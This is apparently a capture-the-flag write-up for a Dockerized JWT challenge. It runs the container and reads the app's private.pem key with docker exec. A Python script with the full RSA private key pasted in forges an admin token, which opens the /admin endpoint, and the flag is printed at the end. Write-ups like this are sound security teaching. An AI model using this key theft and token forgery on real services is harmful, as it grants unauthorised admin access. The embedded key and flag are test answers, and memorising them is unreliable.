@@ -1,0 +1,121 @@
+Auth Deauth
+
+# CTF Challenge Write-up: Dockerized JWT Authentication Service
+
+## Description
+"The developers published their Dockerized JWT authentication service, confident the admin panel is secure. Pull the image, run it locally, and see if their confidence is justified."
+
+## Solution Steps
+1.  **Install Docker:** Docker was not installed, so it was installed on the system.
+    ```bash
+    # Prerequisite packages
+    sudo apt-get update && sudo apt-get install -y ca-certificates curl gnupg lsb-release
+    # Add Docker's GPG key
+    sudo install -m 0755 -d /etc/apt/keyrings && curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg && sudo chmod a+r /etc/apt/keyrings/docker.gpg
+    # Set up Docker repository
+    echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+    # Install Docker Engine
+    sudo apt-get update && sudo apt-get install -y docker-ce docker-ce-cli containerd.io
+    ```
+2.  **Pull Docker Image:** Pulled the specified Docker image using `sudo` due to permission issues.
+    ```bash
+    sudo docker pull shivangi1856/fun-ctf-jwt:ctf-final
+    ```
+3.  **Inspect Docker Image:** Inspected the image to find exposed ports.
+    ```bash
+    sudo docker inspect shivangi1856/fun-ctf-jwt:ctf-final
+    ```
+    Found that port `5000/tcp` was exposed.
+4.  **Run Docker Container:** Ran the container in detached mode, mapping host port 5000 to container port 5000.
+    ```bash
+    sudo docker run -d -p 5000:5000 shivangi1856/fun-ctf-jwt:ctf-final
+    ```
+5.  **Explore Endpoints and Obtain JWT:**
+    *   `curl http://localhost:5000` resulted in a 404.
+    *   `curl http://localhost:5000/login` resulted in a 405 Method Not Allowed (GET not allowed).
+    *   Sent a `POST` request with JSON data to `/login` with dummy credentials (`{"username":"test", "password":"test"}`).
+    ```bash
+    curl -v -X POST -H "Content-Type: application/json" -d '{"username":"test", "password":"test"}' http://localhost:5000/login
+    ```
+    This successfully returned a JWT token.
+6.  **Decode JWT:** Decoded the JWT to understand its structure.
+    ```python
+    import base64
+    import json
+
+    def decode_jwt_part(jwt_part):
+        padding = '=' * (4 - len(jwt_part) % 4)
+        jwt_part_padded = jwt_part + padding
+        decoded_bytes = base64.urlsafe_b64decode(jwt_part_padded)
+        return json.loads(decoded_bytes.decode('utf-8'))
+
+    jwt_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc3MjE0NTM3OSwiZXhwIjoxNzcyMTQ4OTc5fQ.H5ZXUwiZKzoEElkdulpzq_tFes15BUjTC4SOqnTlyQoqxShyWRYi-DUbngVVm8w874Dm19bpNNaQoP285P3xTy6d5XctUEiFoMUORTnW7_6F_NFukPNM8AEBXCXviGXtxHz7K1kmanXhnDhW82OMQg-wA46ejy_TpDKajHW2UWoFNQxcGTcxjqZTCPl2s12fc_XXWFmTJ64MFIrZq3hG0vqNT7eveRMLlqdhAZO4CYY2rZ1c4KSy9lAfeXCD8OwBjvTA_VFgEGl3a-Anexy6KtleqL4W7J09Z7_6oD2oazqDfIj1zmFA1FDhjvgrr9XCz7lwuBkWVSQN9SWDfOi-YA"
+    header, payload, signature = jwt_token.split('.')
+
+    decoded_header = decode_jwt_part(header) # {'alg': 'RS256', 'typ': 'JWT'}
+    decoded_payload = decode_jwt_part(payload) # {'username': 'test', 'role': 'user', 'iat': ..., 'exp': ...}
+    print(f"Decoded Header: {decoded_header}, Decoded Payload: {decoded_payload}")
+    ```
+    The payload showed `"role": "user"`, and the algorithm was `RS256` (asymmetric). To get an admin token, the private key was needed.
+7.  **Find Private Key:** Inspected the Docker container's filesystem by executing commands inside the running container.
+    ```bash
+    sudo docker exec <container_id> ls -la /home/appuser/app
+    sudo docker exec <container_id> ls -la /home/appuser/app/keys
+    ```
+    This revealed `private.pem` in `/home/appuser/app/keys/`. The content of `private.pem` was extracted.
+    ```bash
+    sudo docker exec <container_id> cat /home/appuser/app/keys/private.pem
+    ```
+8.  **Forge Admin JWT:** Used a Python script with the `PyJWT` library and the retrieved `private.pem` to forge a new JWT with `"role": "admin"`.
+    ```python
+    import jwt
+    import time
+
+    private_key = """
+    -----BEGIN PRIVATE KEY-----
+    MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC/EqZAF5GUrcTj
+    umTJsvXQleLEli6ioHPbi3QV2/ZJF3L6GBNnGf79DxgX/gCinay8NW+jtKlkYnGU
+    eL8F/JYTgMNzexYMYXMuaPkwjZHhcQUZ2oClZDgkGU3HxWYmPbTDG7zWQqopmN2S
+    At0MzGkBalQSPsAmR6SyRAjjmMkk/Um6okhrFnfqGu3g82c4QIW1aZJ+hhsiLrB8
+    UBmExkWkMywXsByz7iQITTHpZMyHGKw4fIb3Z6OI+9GfOqiiG9zzfeEx+pj8vnI1
+    9JHZW74q+rtun000+HDYimTh/NFxOjzhs466XQMdd6mMt1jEq4YuDM1BSBk95Abl
+    sKz71ds7AgMBAAECggEARhvispuzSDmmh+TJvJSUy69joLx2aiezuzflJWwrZ1Ba
+    WNfirq8EN/iE37DMrN5sFjcJOqk8il/wywivFtRCgO97R/E++tX6/Gl6Hc2kXHMq
+    6vyYvZcTXnOGbanJvHhhzkFsPbYCV/cGPeAdGegbE3DfXj52JNWe4eZC2Lgj/hTr
+    ynBfzqzuu9CxTb1mWzzXpW/a/fRjT3WGP4++BynMvYNU6NMNtkzwcd2NNbksFY2g
+    s+0wzoeWGVBudpsl5USeqQKxINRS0GbC3eFV+C6Lgk00Y5ESco11FKpEmz/xWVQO
+    bOOEc2mRugPkk+K5FXMVAb7vhFUA7lHdoXhxhGjRWQKBgQDkBF9zKK0ahIy5cd2h
+    xnvHTKTMiNcSjm6C2vz8Rab2UYBU4j59iUxOYLigptwTnhqD349VtIc5tPn3fBQF
+    oYFoLPItlz+rfnH1CCvGamPtYlYEdNAJ8HP23jilvUlcu4PmXQJylJo5NObDbCIO
+    Y8iOz30yG90c/VpXAU3EZmP1PQKBgQDWhZjm4LJGEFIN/3d/tR9cuxvUiS1wawg+
+    LvpgBKWLRC1LhfgdhJqLf3eJFLtQM2ZFX2PB+8TdsAo+TaypiNJeZukbRJGavFYk
+    Um+NZ8mKnmoc4UmSilgsJ9OUhcuwp03cziYKPfKuyY8NB4p++kUQCZ5bvKAl1Msu
+    QSHHDQ7J1wKBgG/1IbTWrSBPIxXPLgbIAXDbVjPDoO7QlryTsBJiVNevLvb+27Yi
+    GyCE50Kii37qa5SCyctIR/lyviXhe6dEJNk08HioQi//dw7cQzo6dPRTC29Gt/uZ
+    YCc/98qRhZsNy3bqBlCiXJNoQUKFLreoEQrmIE/hVJFuaNQ9pKShrcT1AoGAXr+v
+    IvpHgy6eL1SQYTWMXpa92gekrCx5/Y0eRN6Ih5RbNSo8xjzVTZvFHiSr/uZU23sg
+    QoODFi80twPzqQWndM6bUtHcRa29lllar+gRWkpRr+PJbRHxk78bclQN/T5H46ih
+    oJBv6cdYiXa1MxQzALxe10Heshbkjs9xrcsUpw0CgYEApf7tfadM27fNFPzX1syE
+    QupTPg+LWZEZ+dYo4VRC/XcxcALz6ooP4BD0SULDEWbVKYLYh5UD1nWh/Sk1xpZ6
+    OiG68KfgJTACQhmNdXQHrTPt2iZXOa66cOqJEZ25Tmq47eWv6AbSj+GRlPZBnGsW
+    aj816cMQMuc9NIqrxuVcyW4=
+    -----END PRIVATE KEY-----
+    """
+
+    payload = {
+        "username": "admin",
+        "role": "admin",
+        "iat": int(time.time()),
+        "exp": int(time.time()) + 3600
+    }
+
+    encoded_jwt = jwt.encode(payload, private_key, algorithm="RS256")
+    print(encoded_jwt)
+    ```
+9.  **Access Admin Panel:** Used the forged admin JWT to access the `/admin` endpoint.
+    ```bash
+    curl -v -H "Authorization: Bearer <forged_jwt>" http://localhost:5000/admin
+    ```
+
+## Flag
+`NULL{18114r09f5a7}`
